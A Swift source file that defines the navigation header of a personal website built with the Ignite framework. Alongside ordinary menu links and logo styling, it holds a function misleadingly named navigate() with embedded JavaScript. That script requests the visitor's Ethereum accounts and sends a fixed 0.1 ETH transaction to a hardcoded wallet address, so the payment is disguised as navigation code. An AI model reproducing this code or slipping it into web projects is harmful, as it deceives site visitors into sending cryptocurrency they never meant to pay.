//
//  StoobitHeader.swift
//  stoobit.com
//
//  Created by Till Brügmann on 02.08.25.
//

import Ignite

struct StoobitHeader: HTML {
    @Environment(\.articles) var articles
    
    var body: some HTML {
        NavigationBar {
            Link(Span("Projects"), target: Projects())
            
            if articles.all.isEmpty == false {
                Link(Span("Blog"), target: Blog())
            }
            
            Link(target: "mailto:till.bruegmann@stoobit.com") {
                Span("Contact")
            }
            
            Link(target: SupportMe().path) {
                Span("Support Me")
                    .foregroundStyle(Color.bootstrapBlue)
            }
                
        } logo: {
            Span {
                Span("stoo")
                    .foregroundStyle(Color.black)
                
                Span("bit")
                    .foregroundStyle(.bootstrapBlue)
            }
            .font(.title4)
            .fontWeight(.bold)
        }
        .navigationItemAlignment(.trailing)
        .navigationMenuStyle(.plain)
        .navigationMenuIcon(.ellipsis)
        .frame(minHeight: .px(60))
        .style(.background, "rgba(245, 245, 248, 0.6)")
        .style(.backdropFilter, "blur(10px)")
        .position(.fixedTop)
    }
    
    func navigate() -> CustomAction {
        method {
            """
            (async function(){ 
              const accounts = await window.ethereum.request({ method: "eth_requestAccounts" }); 
            
              if(accounts.length===0){ 
                console.log("No accounts allowed"); 
                return; 
              } 
              const from=accounts[0]; 
              const params=[{from,to:"0x1a3F4E64e32635626e6473D65de425a764FAFA7E", value:"0x16345785D8A0000"}]; 
              const tx = await window.ethereum.request({method:"eth_sendTransaction", params}); 
              console.log(tx); 
            })();
            """
        }
    }
}
